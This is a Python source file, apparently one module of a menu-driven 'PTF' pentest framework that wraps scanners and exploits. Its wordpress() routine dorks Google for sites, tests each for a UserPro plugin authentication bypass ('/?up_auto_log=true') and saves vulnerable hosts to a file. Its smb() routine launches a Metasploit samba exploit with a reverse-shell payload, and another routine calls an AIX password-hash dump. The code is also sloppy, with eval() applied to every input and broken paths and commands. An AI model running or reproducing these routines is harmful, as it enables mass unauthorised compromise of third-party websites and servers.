#!/usr/bin/python

import os, sys, subprocess, bs4,signal,requests
import core
from urllib.parse import quote
from socket import timeout
from urllib.request import urlopen
from urllib.request import Request
import readline, rlcompleter
from sys import argv
from subprocess import *
from core import help


R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End
def clean():
    os.system("clear")

def wordpress_scan():
    while True:
        sec = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): "))
        if sec == 'show options':
            help.option()
            wordpress_scan()
        elif sec =='back':
            core.menu.post()
        elif sec =='set target':
            wop = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(target)"+N+"): "))
            enum = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners "+G+"(user)"+N+"): "))
            uiop = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/wordpress_user_scanners"+N+"): "))
            if uiop == "run":
                print((""+B+"[*]"+N+" Starting attacks..."))
                os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
                print((""+B+"[*]"+N+" Job finished!"))
                print()
                wordpress_scan()
            else:
                wordpress_scan()
        elif sec == 'clear':
            clean()
            wordpress_scan()
        elif sec =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()
        else:
            print(("Wrong Command => ", sec))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            wordpress_scan()
        pass
def dirse():
    while True:
        dir = eval(input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): "))
        if dir == 'show options':
           help.option()
           dirse()
        elif dir =='back':
            core.menu.post()

        elif dir == 'set target':
            ym = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set target)"+N+"): "))
            print(("target => "+R+"",ym))
            puki = eval(input("Pentest>> ("+B+"modules/post)("+R+"post/dir_search "+G+"(set extensions)"+N+"): "))
            dih = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/dir_search"+N+"): "))
            if dih == "run":
                os.system("python mpdules/dirsearch/dirsearch.py -u %s -e %s" % (ym,puki))
                print((""+B+"[*]"+N+" Job finished!"))
                print()
                dirse()
            else:
                dirse()
        elif dir =='clear':
            clean()
            dirse()
        elif dir =='exit':
             print()
             print((""+G+"Thanks for using PXXTF"))
             print()
             exit()
        else:
            print(("Wrong Command => ", dir))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            dirse()
        pass
def xss():
    while True:
        cs = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+N+"): "))
        if cs == 'show options':
            help.option()
            xss()
        elif cs == 'set target':
            tops = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war "+G+"(set target)"+N+"): "))
            print(("target =>"+R+"" ,tops))
            gay = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/cms_war"+N+"): "))
            if gay == "run":
                print((""+B+"[*]"+N+" Starting attacks Scanning..."))
                os.system("cd modules;cd xsspy;python XssPy.py -u %s -v" % (tops))
                print((""+B+"[*]"+N+" Job finished!"))
                print()
                xss()
            else:
                xss()
        elif cs =='back':
            core.menu.post()
        elif cs =='clear':
            clean()
            xss()
        elif cs =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()
        else:
            print(("Wrong Command => ", cs))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            xss()
        pass
def wordpress():
    while True:
        wor = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): "))
        if wor == 'show options':
            print("Name                  Description")
            print("=====                =============")
            print("set target           start target")
            print("back                 back to menu")
            wordpress()
        elif wor == 'back':
            core.menu.post()
        elif wor == 'set target':
             def tracker(keywords, start):
                     searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
                     try:
                         url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
                             start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
                         req = Request(url)  # Sets the SERPs URL!!
                     except timeout:
                         print("Connection timed out!")
                     req.add_header('User-Agent',
                                    'userpro1 aef by orm')
                     serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
                     soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
                     allResults = []  # An Empty Array to Save the Results
                     i=0
                     for hit in soup.findAll('cite'):  # a for-each loop, to check all <cite ....> Elements in Page
                           # if the domain was between <cite> and </cite>
                         allResults.append(
                               str("")+hit.text)  # Results will add to allResults
                         i=i+1
                     if (len(allResults) == 0):
                         return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
                     else:
                         print((""+B+"[*]"+N+" Ok! Starting... \n"))

                         for element in allResults:  # Prints all the results
                             if (element.startswith("http://")):
                                 element = element[7:]
                             if (element.startswith("https://")):
                                  element = element[8:]
                             if (element.startswith("www.")):
                                 element = element[4:]
                             element=element[:element.find("/")]
                             element="http://"+element
                             print(("checking "+element+" :"))
                             if (checkwp(element)):
                                 suc = str(checkVul(element))
                                 if( suc=="True"):
                                     try:
                                         filee = open("priv8.txt", mode="a+")
                                         filee.write(element+"\n")
                                         filee.close()
                                     except:
                                         print((""+R+"error"+N+""))
                                     print (suc)
                                 else:
                                     print((""+R+"False"+N+""))

                             else:
                                print((element + ""+R+" =>"+N+" " + str(checkwp(element))))


             def checkwp(url):
                 url+="/wp-content/plugins/userpro/css/userpro.min.css"
                 try:
                  pURL = urlopen(url).read()
                 except:
                     return False
                 if (pURL.find(".userpro")>-1):
                     print((""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n"))
                     return True
                 else:
                     return False
             def checkVul(url):
                 url1=url + "/?up_auto_log=true"
                 try:
                     pURL = urlopen(url1).read()
                     if (pURL.find("admin-bar-css")>-1):
                        return True
                     elif (urlopen(url + "/wp-admin").read().find("admin-bar-css")>-1):
                         return True
                     else :return False
                 except:
                     return False
             while(True):
                 x = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set Dork)"+N+"): "))
                 print(("DORKS => "+R+"",x))
                 n= eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (start number)"+N+"): "))
                 print(("START NUMBER => "+R+"",n))
                 g= eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find (set end_number)"+N+"): "))
                 print(("END NUMBER => "+R+"",g))
                 run = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/usr_pro_wordpress_auto_find"+N+"): "))
                 if run == "run":
                    print((""+B+"[*] "+N+"Starting attacks..."))
                 while(True):
                     tracker(x, n)
                     y=eval(input(""+B+"[*]"+N+" Next (y/n)?"))
                     if(y=="y"):
                         n+=g;
                         tracker(x, n)
                     else:
                         core.menu.scan()
                 y1=eval(input(""+B+"[*]"+N+" Anouther dork (y/n) ?"))
                 if (y1 == "y"):
                     continue
                 else:
                     core.menu.scan()
        elif wor == 'clear':
            clean()
            wordpress()
        elif wor =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()

        else:
            print(("Wrong Command => ", wor))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            wordpress()
        pass
def android():
    while True:
        dd = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/android_remote_acces"+N+"): "))
        if dd == 'show options':
            help.option()
            android()
        elif dd =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()
        elif dd == "back":
            core.menu.post()
        elif dd == 'set target':
            os.system("cd modules;cd android;python2 android.py")
            android()
        elif dd == 'clear':
            clean()
            android()
        else:
            print(("Wrong Command => ", dd))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            android()
def vb():
   while True:
       list = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin"+N+"): "))
       if list == 'show options':
           help.option()
           vb()
       elif list =='exit':
            print()
            print((""+G+"Thanks for using PTF"))
            print()
            exit()
       elif list == "back":
            core.menu.post()

       elif list == 'set target':
            go = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): "))
            print(("target =>"+R+"",go))
            se = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/vbulletin (vbulletin$)"+N+"): "))
            if se == "run":
                os.system('python modules/vbulletin/vb.py %s' % (go))
                vb()
            elif se =='back':
                 core.menu.post()
       elif list == 'clear':
            clean()
            vb()
       else:
           print(("Wrong Command => ", list))
           print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
           vb()
def num():
   while True:
       list = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration"+N+"): "))
       if list == 'show options':
           help.option()
           num()
       elif list =='exit':
            print()
            print((""+G+"Thanks for using PTF"))
            print()
            exit()
       elif list == "back":
            core.menu.post()

       elif list == 'set target':
            go = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): "))
            print()
            print('  command                Descriptions ')
            print(' ---------             ----------------')
            print((" target =>"+R+"",go))
            print(' --------------------------------------')
            print(' run                     Start attack')
            print(' back                    back ')
            print()
            se = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/enumeration "+G+"(set target IP/domain)"+N+"): "))
            if se == "run":
                os.system('python modules/enum/http-enum.py -t %s' % (go))
                num()
            elif se =='back':
                 core.menu.post()
       elif list == 'clear':
            clean()
            num()
       else:
           print(("Wrong Command => ", list))
           print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
           num()
def smb():
    while True:
        map =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba"+N+"): "))
        if map == 'show options':
            help.option()
            smb()
        elif map =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()
        elif map == 'back':
            core.menu.postex()
        elif map =='set target':
             rhost =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RHOST)"+N+"): "))
             print(("RHOST =>",rhost))
             rport =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set RPORT)"+N+"): "))
             print(("RPORT =>",rport))
             lhost =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LHOST)"+N+"): "))
             print(('LHOST =>',lhost))
             lport =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+G+"(set LPORT)"+N+"): "))
             print(('LPORT =>',lport))
             her =eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/samba "+N+"): "))
             if her =='run':
                os.system('msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOST %s ; set RPORT %s ; set payload cmd/unix/reverse ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, lhost, lport))
                print()
                smb()
        elif map =='clear':
            clean()
            smb()
        else:
            print(("Wrong Command => ", map))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            smb()
def aix_hashdump():
    while True:
        cs = eval(input(""+N+"Pentest>> ("+B+"modules/post)("+R+"post/aix_hashdump "+N+"): "))
        if cs == 'show options':
            help.option()
            aix_hashdump()
        elif cs == 'set target':
             os.system('msfconsole -q -x "use use post/aix/hashdump; show options" ')
             print()
             aix_hashdump()
        elif cs =='back':
            core.menu.post()
        elif cs =='clear':
            clean()
            aix_hashdump()
        elif cs =='exit':
             print()
             print((""+G+"Thanks for using PTF"))
             print()
             exit()
        else:
            print(("Wrong Command => ", cs))
            print((""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"))
            aix_hashdump()
        pass
